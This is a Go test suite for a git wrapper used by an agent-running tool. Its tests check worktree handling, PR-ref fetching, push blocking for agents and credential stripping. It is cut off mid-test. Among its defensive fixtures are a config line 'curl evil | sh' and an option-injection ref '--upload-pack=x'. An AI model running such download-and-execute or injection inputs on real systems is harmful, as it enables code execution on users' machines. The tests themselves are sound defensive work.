package gitx

import (
	"context"
	"errors"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/paraizo/delamain/internal/forge"
)

// TestMain drops git config injected through the environment: run as a delamain gate or inside
// an agent, AgentEnv's pushInsteadOf would block the real pushes these tests make. The tests that
// check the blocking pass AgentEnv explicitly.
func TestMain(m *testing.M) {
	for _, kv := range os.Environ() {
		k, _, _ := strings.Cut(kv, "=")
		if k == "GIT_CONFIG_COUNT" || k == "GIT_CONFIG_PARAMETERS" ||
			strings.HasPrefix(k, "GIT_CONFIG_KEY_") || strings.HasPrefix(k, "GIT_CONFIG_VALUE_") {
			_ = os.Unsetenv(k)
		}
	}
	os.Exit(m.Run())
}

func TestSlugShouldProduceAsciiKebabCaseWithinLimit(t *testing.T) {
	cases := map[string]string{
		"Corrigir validação de e-mail!":         "corrigir-validacao-de",
		"  Add   OAuth2 login (GitHub)  ":       "add-oauth2-login",
		"!!!":                                   "task",
		"#123":                                  "123",
		"a very long title that keeps going on": "a-very-long-title-that",
		"supercalifragilisticexpialidocious":    "supercalifragilisticex", // single word: hard cut
	}
	for in, want := range cases {
		if got := Slug(in, 22); got != want {
			t.Errorf("Slug(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestBranchNameShouldUseFixForBugsAndFeatOtherwise(t *testing.T) {
	if got := BranchName("bug", "#12", "Login quebra com acento"); got != "fix/12-login-quebra-com-acento" {
		t.Fatalf("bug branch: %q", got)
	}
	if got := BranchName("feature", "task:add-x", "Add export"); got != "feat/task-add-x-add-export" {
		t.Fatalf("feature branch: %q", got)
	}
}

func TestBranchNameShouldKeepDistinctTaskRefsDistinct(t *testing.T) {
	a := BranchName("bug", "task:fix-add", "Corrigir soma")
	b := BranchName("bug", "task:fix-add-v2", "Corrigir soma")
	if a == b {
		t.Fatalf("different tasks must not share a branch: %q", a)
	}
}

func TestGuardWorkBranchShouldRefuseProtectedAndBaseBranches(t *testing.T) {
	for _, b := range []string{"main", "master", "develop", "", "HEAD"} {
		if err := GuardWorkBranch(b, "origin/develop"); err == nil {
			t.Errorf("%q must be refused as a work branch", b)
		}
	}
	if err := GuardWorkBranch("feat/12-x", "origin/main"); err != nil {
		t.Fatalf("a feature branch is allowed: %v", err)
	}
}

// repo creates a real git repository with one commit on main.
func repo(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	for _, args := range [][]string{
		{"init", "-q", "-b", "main"},
		{"-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "chore: init"},
	} {
		cmd := exec.Command("git", append([]string{"-C", dir}, args...)...)
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v %s", args, err, out)
		}
	}
	return dir
}

func TestResolveBaseShouldUseLocalBranchWhenThereIsNoRemote(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	base, err := g.ResolveBase(ctx, r)
	if err != nil || base != "main" {
		t.Fatalf("got %q %v", base, err)
	}
	if g.HasRemote(ctx, r, "origin") {
		t.Fatal("fresh repo has no origin")
	}
}

func TestCommitsAndChangedFilesShouldReflectWorkSinceBase(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	if cs, err := g.CommitsSince(ctx, r, "main"); err != nil || len(cs) != 0 {
		t.Fatalf("no work yet: %v %v", cs, err)
	}
	run := func(args ...string) {
		t.Helper()
		if out, err := exec.Command("git", append([]string{"-C", r}, args...)...).CombinedOutput(); err != nil {
			t.Fatalf("%v %s", err, out)
		}
	}
	run("switch", "-q", "-c", "feat/x")
	if err := os.WriteFile(filepath.Join(r, "a.go"), []byte("package a\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if st, _ := g.Status(ctx, r); st == "" {
		t.Fatal("untracked file must make status dirty")
	}
	run("add", "a.go")
	run("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "feat: add a")
	cs, _ := g.CommitsSince(ctx, r, "main")
	files, _ := g.ChangedFiles(ctx, r, "main")
	if len(cs) != 1 || len(files) != 1 || files[0] != "a.go" {
		t.Fatalf("commits=%v files=%v", cs, files)
	}
	if b, _ := g.CurrentBranch(ctx, r); b != "feat/x" {
		t.Fatalf("branch %q", b)
	}
	if !g.BranchExists(ctx, r, "feat/x") || g.BranchExists(ctx, r, "nope") {
		t.Fatal("BranchExists wrong")
	}
}

// withOrigin gives repo r a bare origin and a pushed-nothing state.
func withOrigin(t *testing.T, r string) string {
	t.Helper()
	bare := filepath.Join(t.TempDir(), "origin.git")
	for _, args := range [][]string{{"init", "-q", "--bare", bare}, {"-C", r, "remote", "add", "origin", bare}} {
		if out, err := exec.Command("git", args...).CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v %s", args, err, out)
		}
	}
	return bare
}

func TestPushShouldPublishWorkBranchWithoutForce(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	withOrigin(t, r)
	if out, err := exec.Command("git", "-C", r, "switch", "-q", "-c", "feat/x").CombinedOutput(); err != nil {
		t.Fatalf("%v %s", err, out)
	}
	if ok, err := g.RemoteBranchExists(ctx, r, "feat/x"); err != nil || ok {
		t.Fatalf("not pushed yet: %v %v", ok, err)
	}
	if err := g.Push(ctx, r, "feat/x", "origin/main"); err != nil {
		t.Fatal(err)
	}
	if ok, err := g.RemoteBranchExists(ctx, r, "feat/x"); err != nil || !ok {
		t.Fatalf("branch must be on origin: %v %v", ok, err)
	}
}

func TestPushShouldRefuseProtectedBranchesBeforeTouchingTheRemote(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	withOrigin(t, r)
	for _, b := range []string{"main", "master", "develop"} {
		if err := g.Push(ctx, r, b, "origin/develop"); err == nil {
			t.Errorf("push of %q must be refused", b)
		}
	}
	if ok, _ := g.RemoteBranchExists(ctx, r, "main"); ok {
		t.Fatal("main must not reach origin")
	}
}

func TestAgentEnvShouldBlockEveryPushButKeepFetch(t *testing.T) {
	ctx := context.Background()
	r := repo(t)
	bare := withOrigin(t, r)
	for _, remote := range []string{"origin", "https://github.com/acme/none.git", "git@github.com:acme/none.git", "ssh://git@gitlab.com/acme/none.git"} {
		cmd := exec.CommandContext(ctx, "git", "-C", r, "push", remote, "main")
		cmd.Env = append(os.Environ(), append(AgentEnv(), "GIT_TERMINAL_PROMPT=0")...)
		if out, err := cmd.CombinedOutput(); err == nil {
			t.Errorf("agent push to %s must fail: %s", remote, out)
		}
	}
	if out, err := exec.Command("git", "--git-dir", bare, "for-each-ref").Output(); err != nil || len(out) != 0 {
		t.Fatalf("origin must stay empty, refs: %s %v", out, err)
	}
	fetch := exec.CommandContext(ctx, "git", "-C", r, "fetch", "-q", "origin")
	fetch.Env = append(os.Environ(), AgentEnv()...)
	if out, err := fetch.CombinedOutput(); err != nil {
		t.Fatalf("agents still need fetch: %v %s", err, out)
	}
}

func TestRedProofWorktreeShouldCarryOnlyTheBranchTestsOntoBase(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	run := func(args ...string) {
		t.Helper()
		if out, err := exec.Command("git", append([]string{"-C", r, "-c", "user.name=t", "-c", "user.email=t@t"}, args...)...).CombinedOutput(); err != nil {
			t.Fatalf("%v %s", err, out)
		}
	}
	run("switch", "-q", "-c", "fix/x")
	for name, body := range map[string]string{"calc.go": "fixed", "calc_test.go": "test"} {
		if err := os.WriteFile(filepath.Join(r, name), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	run("add", "calc.go", "calc_test.go")
	run("commit", "-q", "-m", "fix: x")

	dir := filepath.Join(t.TempDir(), "redproof")
	if err := g.AddDetachedWorktree(ctx, r, dir, "main"); err != nil {
		t.Fatal(err)
	}
	if err := g.CheckoutFiles(ctx, dir, "fix/x", []string{"calc_test.go"}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(dir, "calc.go")); !os.IsNotExist(err) {
		t.Fatal("the fix must not reach the base worktree")
	}
	if b, _ := os.ReadFile(filepath.Join(dir, "calc_test.go")); string(b) != "test" {
		t.Fatalf("the branch test must be applied, got %q", b)
	}
	if err := g.RemoveWorktree(ctx, r, dir); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(dir); !os.IsNotExist(err) {
		t.Fatal("temporary worktree must be gone")
	}
	if b, _ := g.CurrentBranch(ctx, r); b != "fix/x" {
		t.Fatalf("the work branch is untouched, got %q", b)
	}
}

func TestDiscardEmptyWorkShouldRemoveWorktreeAndBranchWithoutCommits(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	wt := filepath.Join(t.TempDir(), "wt")
	if out, err := exec.Command("git", "-C", r, "worktree", "add", "-q", "-b", "fix/empty", wt, "main").CombinedOutput(); err != nil {
		t.Fatalf("%v %s", err, out)
	}
	if err := g.DiscardEmptyWork(ctx, r, wt, "fix/empty", "main"); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(wt); !os.IsNotExist(err) || g.BranchExists(ctx, r, "fix/empty") {
		t.Fatal("an empty halted run must leave nothing behind")
	}
}

func TestDiscardEmptyWorkShouldRefuseBranchesWithCommits(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	wt := filepath.Join(t.TempDir(), "wt")
	for _, args := range [][]string{
		{"-C", r, "worktree", "add", "-q", "-b", "fix/work", wt, "main"},
		{"-C", wt, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "fix: work"},
	} {
		if out, err := exec.Command("git", args...).CombinedOutput(); err != nil {
			t.Fatalf("%v %s", err, out)
		}
	}
	if err := g.DiscardEmptyWork(ctx, r, wt, "fix/work", "main"); err == nil {
		t.Fatal("committed work must never be discarded")
	}
	if _, err := os.Stat(wt); err != nil || !g.BranchExists(ctx, r, "fix/work") {
		t.Fatal("worktree and branch must survive")
	}
}

func TestDiscardEmptyWorkShouldKeepUncommittedChanges(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	wt := filepath.Join(t.TempDir(), "wt")
	if out, err := exec.Command("git", "-C", r, "worktree", "add", "-q", "-b", "fix/dirty", wt, "main").CombinedOutput(); err != nil {
		t.Fatalf("%v %s", err, out)
	}
	_ = os.WriteFile(filepath.Join(wt, "wip.go"), []byte("package x"), 0o600)
	if err := g.DiscardEmptyWork(ctx, r, wt, "fix/dirty", "main"); err == nil {
		t.Fatal("uncommitted agent work must not be thrown away")
	}
	if _, err := os.Stat(filepath.Join(wt, "wip.go")); err != nil || !g.BranchExists(ctx, r, "fix/dirty") {
		t.Fatal("dirty worktree and its branch must survive")
	}
}

func TestAddWorktreeShouldCheckANewWorkBranchOutAtBase(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	wt := filepath.Join(t.TempDir(), "wts", "repo", "feat", "1-x")
	if err := g.AddWorktree(ctx, r, wt, "feat/1-x", "main"); err != nil {
		t.Fatal(err)
	}
	if b, _ := g.CurrentBranch(ctx, wt); b != "feat/1-x" {
		t.Fatalf("worktree is on %q", b)
	}
	head, _ := g.Head(ctx, wt)
	base, _ := g.Head(ctx, r)
	if head != base {
		t.Fatalf("branch starts at base: %s vs %s", head, base)
	}
	if err := g.AddWorktree(ctx, r, filepath.Join(t.TempDir(), "again"), "feat/1-x", "main"); err == nil {
		t.Fatal("an existing branch is never reused")
	}
}

func TestAddWorktreeShouldRefuseProtectedBranches(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	wt := filepath.Join(t.TempDir(), "wt")
	if err := g.AddWorktree(ctx, r, wt, "main", "main"); err == nil {
		t.Fatal("work never happens on a protected branch")
	}
	if _, err := os.Stat(wt); !os.IsNotExist(err) {
		t.Fatal("nothing is created when refused")
	}
}

func TestListWorktreesShouldReportEveryCheckoutWithItsBranch(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	wt := filepath.Join(t.TempDir(), "wt")
	if err := g.AddWorktree(ctx, r, wt, "feat/2-y", "main"); err != nil {
		t.Fatal(err)
	}
	detached := filepath.Join(t.TempDir(), "detached")
	if err := g.AddDetachedWorktree(ctx, r, detached, "main"); err != nil {
		t.Fatal(err)
	}
	got, err := g.ListWorktrees(ctx, r)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 3 {
		t.Fatalf("main checkout + 2 worktrees, got %+v", got)
	}
	byPath := map[string]Worktree{}
	for _, w := range got {
		p, _ := filepath.EvalSymlinks(w.Path)
		byPath[p] = w
	}
	resolve := func(p string) string { s, _ := filepath.EvalSymlinks(p); return s }
	if w := byPath[resolve(wt)]; w.Branch != "feat/2-y" || len(w.Head) != 40 {
		t.Fatalf("work worktree = %+v", w)
	}
	if w := byPath[resolve(detached)]; w.Branch != "" || !w.Detached {
		t.Fatalf("detached worktree = %+v", w)
	}
	if w := byPath[resolve(r)]; w.Branch != "main" {
		t.Fatalf("main checkout = %+v", w)
	}
}

// Every run names its worktrees after the repository and finds the checkout of a branch by its
// path, so the repository a run works on must be the same from wherever the command was called —
// including from inside one of its worktrees, where Toplevel answers that worktree instead.
func TestMainWorktreeShouldAnswerTheRepositoryFromInsideAnyOfItsWorktrees(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	wt := filepath.Join(t.TempDir(), "wt")
	if err := g.AddWorktree(ctx, r, wt, "feat/3-z", "main"); err != nil {
		t.Fatal(err)
	}
	sub := filepath.Join(wt, "pkg", "deep")
	if err := os.MkdirAll(sub, 0o700); err != nil {
		t.Fatal(err)
	}
	resolve := func(p string) string { s, _ := filepath.EvalSymlinks(p); return s }
	for _, dir := range []string{r, wt, sub} {
		got, err := g.MainWorktree(ctx, dir)
		if err != nil {
			t.Fatalf("MainWorktree(%s): %v", dir, err)
		}
		if resolve(got) != resolve(r) {
			t.Errorf("MainWorktree(%s) = %s, want the repository %s", dir, got, r)
		}
	}
	// The contrast that makes this function necessary: inside a worktree, Toplevel is the worktree.
	top, err := g.Toplevel(ctx, sub)
	if err != nil {
		t.Fatal(err)
	}
	if resolve(top) != resolve(wt) {
		t.Fatalf("Toplevel(%s) = %s, want the worktree %s", sub, top, wt)
	}
}

func TestMainWorktreeShouldFailOutsideAnyRepository(t *testing.T) {
	g, ctx := New(), context.Background()
	if _, err := g.MainWorktree(ctx, t.TempDir()); err == nil {
		t.Fatal("a directory that belongs to no repository must fail, never answer a path")
	}
}

func envValue(env []string, key string) string {
	v := ""
	for _, kv := range env { // the last value wins, as in exec
		if k, val, _ := strings.Cut(kv, "="); k == key {
			v = val
		}
	}
	return v
}

func TestAgentEnvironShouldStripForgeAndGenericTokens(t *testing.T) {
	base := []string{
		"PATH=/usr/bin", "HOME=/home/dev",
		"GH_TOKEN=s-gh", "GITHUB_TOKEN=s-github", "GH_ENTERPRISE_TOKEN=s-ghe", "GITHUB_ENTERPRISE_TOKEN=s-github-e",
		"GITLAB_TOKEN=s-gitlab", "GITLAB_ACCESS_TOKEN=s-gitlab-a", "OAUTH_TOKEN=s-oauth",
		"NPM_TOKEN=s-npm", "DEPLOY_PAT=s-pat", "DB_SECRET=s-db", "lower_token=s-lower",
		"OPENAI_API_KEY=k-openai", "ANTHROPIC_API_KEY=k-anthropic",
	}
	env := AgentEnviron(base)
	for _, kv := range env {
		if _, v, _ := strings.Cut(kv, "="); strings.HasPrefix(v, "s-") {
			t.Errorf("credential reached the agent: %s", kv)
		}
	}
	for key, want := range map[string]string{"PATH": "/usr/bin", "HOME": "/home/dev", "OPENAI_API_KEY": "k-openai", "ANTHROPIC_API_KEY": "k-anthropic"} {
		if got := envValue(env, key); got != want {
			t.Errorf("%s = %q, want %q: the agent's own keys must stay", key, got, want)
		}
	}
}

func TestAgentEnvironShouldKeepHarnessAllowlistedKeys(t *testing.T) {
	env := AgentEnviron([]string{"CLAUDE_CODE_OAUTH_TOKEN=c-oauth", "ANTHROPIC_AUTH_TOKEN=a-auth", "GH_TOKEN=s-gh"})
	for key, want := range map[string]string{"CLAUDE_CODE_OAUTH_TOKEN": "c-oauth", "ANTHROPIC_AUTH_TOKEN": "a-auth"} {
		if got := envValue(env, key); got != want {
			t.Errorf("%s = %q, want %q: the harness needs its own credential", key, got, want)
		}
	}
}

func TestAgentEnvironShouldStillBlockPushes(t *testing.T) {
	ctx := context.Background()
	r := repo(t)
	bare := withOrigin(t, r)
	cmd := exec.CommandContext(ctx, "git", "-C", r, "push", "origin", "main")
	cmd.Env = append(AgentEnviron(os.Environ()), "GIT_TERMINAL_PROMPT=0")
	if out, err := cmd.CombinedOutput(); err == nil {
		t.Fatalf("agent push must fail: %s", out)
	}
	if out, err := exec.Command("git", "--git-dir", bare, "for-each-ref").Output(); err != nil || len(out) != 0 {
		t.Fatalf("origin must stay empty, refs: %s %v", out, err)
	}
}

// gitIn runs git in dir as a fixed author and returns its trimmed output.
func gitIn(t *testing.T, dir string, args ...string) string {
	t.Helper()
	out, err := exec.Command("git", append([]string{"-C", dir, "-c", "user.name=t", "-c", "user.email=t@t"}, args...)...).CombinedOutput()
	if err != nil {
		t.Fatalf("git %v: %v %s", args, err, out)
	}
	return strings.TrimSpace(string(out))
}

// commitFile writes body to name in dir, commits it and returns the commit SHA.
func commitFile(t *testing.T, dir, name, body string) string {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(filepath.Join(dir, name)), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	gitIn(t, dir, "add", name)
	gitIn(t, dir, "commit", "-q", "-m", "change "+name)
	return gitIn(t, dir, "rev-parse", "HEAD")
}

// prOrigin gives a repository an origin holding main and a PR head under ref, as a forge
// exposes PRs and fork PRs: the head commit is not on any branch of the repository.
func prOrigin(t *testing.T, ref string) (r, head string) {
	t.Helper()
	r = repo(t)
	withOrigin(t, r)
	gitIn(t, r, "push", "-q", "origin", "main")
	gitIn(t, r, "switch", "-q", "-c", "contributor")
	head = commitFile(t, r, "feature.go", "package feature\n")
	gitIn(t, r, "push", "-q", "origin", "HEAD:"+ref)
	gitIn(t, r, "switch", "-q", "main")
	gitIn(t, r, "branch", "-q", "-D", "contributor")
	return r, head
}

func TestFetchPRHeadShouldFetchGitHubPullRefIntoDelamainRef(t *testing.T) {
	g, ctx := New(), context.Background()
	r, head := prOrigin(t, "refs/pull/7/head")
	mainBefore := gitIn(t, r, "rev-parse", "main")

	sha, err := g.FetchPRHead(ctx, r, forge.GitHub, 7)
	if err != nil {
		t.Fatal(err)
	}
	if sha != head {
		t.Fatalf("FetchPRHead returned %q, want the PR head %q", sha, head)
	}
	if got := gitIn(t, r, "rev-parse", "refs/delamain/pr/7"); got != head {
		t.Fatalf("refs/delamain/pr/7 = %q, want %q", got, head)
	}
	if got := gitIn(t, r, "rev-parse", "main"); got != mainBefore {
		t.Fatalf("the fetch must not move local branches: main %s -> %s", mainBefore, got)
	}
	if refs := gitIn(t, r, "for-each-ref", "--format=%(refname)", "refs/heads", "refs/tags"); refs != "refs/heads/main" {
		t.Fatalf("only the delamain ref may be created, got heads/tags %q", refs)
	}
}

func TestFetchPRHeadShouldFetchGitLabMergeRequestRef(t *testing.T) {
	g, ctx := New(), context.Background()
	r, head := prOrigin(t, "refs/merge-requests/12/head")

	sha, err := g.FetchPRHead(ctx, r, forge.GitLab, 12)
	if err != nil {
		t.Fatal(err)
	}
	if sha != head || gitIn(t, r, "rev-parse", "refs/delamain/pr/12") != head {
		t.Fatalf("got %q, want the MR head %q in refs/delamain/pr/12", sha, head)
	}
	if _, err := g.FetchPRHead(ctx, r, forge.GitHub, 12); err == nil {
		t.Fatal("a GitLab MR is not under refs/pull: the GitHub refspec must fail")
	}
}

func TestFetchPRHeadShouldFollowAForcePushedPRHead(t *testing.T) {
	g, ctx := New(), context.Background()
	r, first := prOrigin(t, "refs/pull/7/head")
	if _, err := g.FetchPRHead(ctx, r, forge.GitHub, 7); err != nil {
		t.Fatal(err)
	}
	// The author rewrites the PR: the new head does not descend from the old one.
	gitIn(t, r, "switch", "-q", "-c", "rewrite")
	second := commitFile(t, r, "other.go", "package other\n")
	gitIn(t, r, "push", "-q", "--force", "origin", "HEAD:refs/pull/7/head")
	gitIn(t, r, "switch", "-q", "main")

	sha, err := g.FetchPRHead(ctx, r, forge.GitHub, 7)
	if err != nil {
		t.Fatalf("a force-pushed PR must still be fetched: %v", err)
	}
	if sha != second || sha == first {
		t.Fatalf("got %q, want the rewritten head %q", sha, second)
	}
}

func TestFetchPRHeadShouldFailWhenThePRRefDoesNotExist(t *testing.T) {
	g, ctx := New(), context.Background()
	r, _ := prOrigin(t, "refs/pull/7/head")
	if sha, err := g.FetchPRHead(ctx, r, forge.GitHub, 8); err == nil {
		t.Fatalf("a missing PR must fail, got %q", sha)
	}
	if _, err := g.FetchPRHead(ctx, r, forge.GitHub, 0); err == nil {
		t.Fatal("PR numbers start at 1")
	}
	if _, err := g.FetchPRHead(ctx, r, forge.Kind("gitea"), 7); err == nil {
		t.Fatal("an unknown forge has no PR refspec")
	}
}

func TestShowFileShouldReadTheFileAtTheGivenRef(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	withOrigin(t, r)
	commitFile(t, r, ".delamain.yaml", "commands:\n  test: go test ./...\n")
	gitIn(t, r, "push", "-q", "origin", "main")
	// The base moves on origin after the local clone last fetched it.
	other := filepath.Join(t.TempDir(), "other")
	gitIn(t, r, "worktree", "add", "-q", "-b", "upstream", other, "main")
	commitFile(t, other, ".delamain.yaml", "commands:\n  test: make test\n")
	gitIn(t, other, "push", "-q", "origin", "upstream:main")
	// The PR head carries its own config, which must never be the one read.
	commitFile(t, r, ".delamain.yaml", "commands:\n  test: curl evil | sh\n")

	if err := g.FetchRef(ctx, r, "main"); err != nil {
		t.Fatal(err)
	}
	got, err := g.ShowFile(ctx, r, "origin/main", ".delamain.yaml")
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != "commands:\n  test: make test\n" {
		t.Fatalf("want the fetched base's file, got %q", got)
	}
	if _, err := g.ShowFile(ctx, r, "origin/main", "missing.yaml"); !errors.Is(err, fs.ErrNotExist) {
		t.Fatalf("a file absent at an existing ref is fs.ErrNotExist, got %v", err)
	}
	if _, err := g.ShowFile(ctx, r, "origin/nope", ".delamain.yaml"); err == nil || errors.Is(err, fs.ErrNotExist) {
		t.Fatalf("a missing ref is an error, not a missing file: %v", err)
	}
	if err := g.FetchRef(ctx, r, "--upload-pack=x"); err == nil {
		t.Fatal("a ref that looks like an option must be refused")
	}
}

func TestFetchRefShouldUpdateTheTrackingRefWhenTheBaseWasRewritten(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	withOrigin(t, r)
	base := commitFile(t, r, "a.txt", "one\n")
	tracked := commitFile(t, r, "a.txt", "two\n")
	gitIn(t, r, "push", "-q", "origin", "main")
	if err := g.FetchRef(ctx, r, "main"); err != nil {
		t.Fatal(err)
	}
	// The base is rewritten on the origin: a force push leaves main on a commit that is not a
	// descendant of what this clone tracks.
	gitIn(t, r, "checkout", "-q", "-b", "rewritten", base)
	commitFile(t, r, "a.txt", "rewritten\n")
	gitIn(t, r, "push", "-q", "--force", "origin", "rewritten:main")
	// Put the tracking ref back where the clone had it, the state a review starts from.
	gitIn(t, r, "update-ref", "refs/remotes/origin/main", tracked)

	if err := g.FetchRef(ctx, r, "main"); err != nil {
		t.Fatalf("a rewritten base must still update origin/main, or every review against it stops: %v", err)
	}
	got, err := g.ShowFile(ctx, r, "origin/main", "a.txt")
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != "rewritten\n" {
		t.Fatalf("origin/main must hold the rewritten base, got %q", got)
	}
	// Only the tracking ref moved: no local branch was rewritten under the operator.
	if head := gitIn(t, r, "rev-parse", "refs/heads/main"); head != tracked {
		t.Fatalf("local main must stay at %s, got %s", tracked, head)
	}
}

func TestChangedLinesShouldReturnOnlyAddedOrModifiedHunksOfTheHead(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	commitFile(t, r, "a.txt", "1\n2\n3\n4\n5\n")
	commitFile(t, r, "gone.txt", "x\ny\n")
	commitFile(t, r, "trim.txt", "1\n2\n3\n")
	commitFile(t, r, "old name.txt", "alpha\nbeta\ngamma\ndelta\n")
	commitFile(t, r, "inc.txt", "a\nb\nc\nd\n")
	base := gitIn(t, r, "rev-parse", "HEAD")
	gitIn(t, r, "switch", "-q", "-c", "pr")
	commitFile(t, r, "a.txt", "1\nTWO\n3\n4\n5\n6\n7\n") // line 2 modified, 6-7 added
	gitIn(t, r, "rm", "-q", "gone.txt")
	commitFile(t, r, "trim.txt", "1\n3\n") // only a removal: nothing to comment on
	gitIn(t, r, "mv", "old name.txt", "new name.txt")
	commitFile(t, r, "new name.txt", "alpha\nbeta\nGAMMA\ndelta\n")
	commitFile(t, r, "bin.dat", "\x00\x01\x02")
	commitFile(t, r, "fresh.go", "package fresh\n\nfunc F() {}\n")
	commitFile(t, r, "inc.txt", "a\n++ b/x\nb\nc\nD\n") // an added line that looks like a "+++" header

	got, err := g.ChangedLines(ctx, r, base)
	if err != nil {
		t.Fatal(err)
	}
	want := map[string][]LineRange{
		"a.txt":        {{2, 2}, {6, 7}},
		"new name.txt": {{3, 3}},
		"fresh.go":     {{1, 3}},
		"inc.txt":      {{2, 2}, {5, 5}},
	}
	if len(got) != len(want) {
		t.Fatalf("got %v, want %v", got, want)
	}
	for f, ranges := range want {
		if !slices.Equal(got[f], ranges) {
			t.Errorf("%s: got %v, want %v", f, got[f], ranges)
		}
	}
}

func TestDeleteRefShouldRemoveThePRRef(t *testing.T) {
	g, ctx := New(), context.Background()
	r, _ := prOrigin(t, "refs/pull/7/head")
	if _, err := g.FetchPRHead(ctx, r, forge.GitHub, 7); err != nil {
		t.Fatal(err)
	}
	if err := g.DeleteRef(ctx, r, PRRef(7)); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command("git", "-C", r, "rev-parse", "--verify", "--quiet", "refs/delamain/pr/7").CombinedOutput(); err == nil {
		t.Fatalf("refs/delamain/pr/7 must be gone, still at %s", out)
	}
	if err := g.DeleteRef(ctx, r, "refs/heads/main"); err == nil {
		t.Fatal("only delamain's own refs may be deleted")
	}
	if !g.BranchExists(ctx, r, "main") {
		t.Fatal("main must survive a refused delete")
	}
}

// hostileCheckout gives repo r an operator config that runs commands on checkout, as husky's
// relative core.hooksPath and a global smudge filter (git-lfs, say) do, and a branch "pr" whose
// own files would be what runs. It returns the dir where those commands leave markers.
func hostileCheckout(t *testing.T, r string) string {
	t.Helper()
	marks := t.TempDir()
	gitIn(t, r, "switch", "-q", "-c", "pr")
	hook := filepath.Join(r, ".husky", "post-checkout")
	if err := os.MkdirAll(filepath.Dir(hook), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(hook, []byte("#!/bin/sh\ntouch "+filepath.Join(marks, "hook")+"\n"), 0o700); err != nil { //nolint:gosec // executable test hook
		t.Fatal(err)
	}
	commitFile(t, r, ".gitattributes", "*.txt filter=evil\n")
	gitIn(t, r, "add", ".husky/post-checkout")
	commitFile(t, r, "a.txt", "raw\n")
	gitIn(t, r, "switch", "-q", "main")
	// Git versions differ on where a relative hooksPath resolves for a new worktree (its root or
	// the repository's): the hook is in both.
	if err := os.MkdirAll(filepath.Dir(hook), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(hook, []byte("#!/bin/sh\ntouch "+filepath.Join(marks, "hook")+"\n"), 0o700); err != nil { //nolint:gosec // executable test hook
		t.Fatal(err)
	}
	gitIn(t, r, "config", "core.hooksPath", ".husky")
	gitIn(t, r, "config", "filter.evil.smudge", "sh -c 'touch "+filepath.Join(marks, "smudge")+"; cat'")
	gitIn(t, r, "config", "filter.evil.clean", "sh -c 'touch "+filepath.Join(marks, "clean")+"; cat'")
	return marks
}

func TestAddUntrustedWorktreeShouldRunNoHookNorFilterOfTheCheckout(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	marks := hostileCheckout(t, r)

	wt := filepath.Join(t.TempDir(), "review")
	if err := g.AddUntrustedWorktree(ctx, r, wt, "pr"); err != nil {
		t.Fatal(err)
	}
	if b, err := os.ReadFile(filepath.Join(wt, "a.txt")); err != nil || string(b) != "raw\n" {
		t.Fatalf("the PR's files are checked out as committed: %q %v", b, err)
	}
	if _, err := g.UntrustedStatus(ctx, wt); err != nil {
		t.Fatal(err)
	}
	if ran, _ := os.ReadDir(marks); len(ran) != 0 {
		t.Fatalf("checking out third-party code ran %v on the operator's machine", ran)
	}

	// Control: a plain checkout of the same branch does run them, so the fixture is hostile.
	if err := g.AddDetachedWorktree(ctx, r, filepath.Join(t.TempDir(), "plain"), "pr"); err != nil {
		t.Fatal(err)
	}
	for _, m := range []string{"hook", "smudge"} {
		if _, err := os.Stat(filepath.Join(marks, m)); err != nil {
			t.Fatalf("the fixture's %s must run on a plain checkout: %v", m, err)
		}
	}
}

func TestChangedLinesShouldRunNoTextconvTheCheckoutPicks(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	base := gitIn(t, r, "rev-parse", "HEAD")
	marks := t.TempDir()
	// The operator's textconv driver; the PR's .gitattributes decides which files it runs on.
	gitIn(t, r, "config", "diff.evil.textconv", "sh -c 'touch "+filepath.Join(marks, "textconv")+"; cat \"$0\"'")
	gitIn(t, r, "switch", "-q", "-c", "pr")
	commitFile(t, r, ".gitattributes", "*.txt diff=evil\n")
	commitFile(t, r, "a.txt", "one\ntwo\n")

	got, err := g.ChangedLines(ctx, r, base)
	if err != nil {
		t.Fatal(err)
	}
	if ran, _ := os.ReadDir(marks); len(ran) != 0 {
		t.Fatalf("reading the PR's diff lines ran %v", ran)
	}
	if !slices.Equal(got["a.txt"], []LineRange{{1, 2}}) {
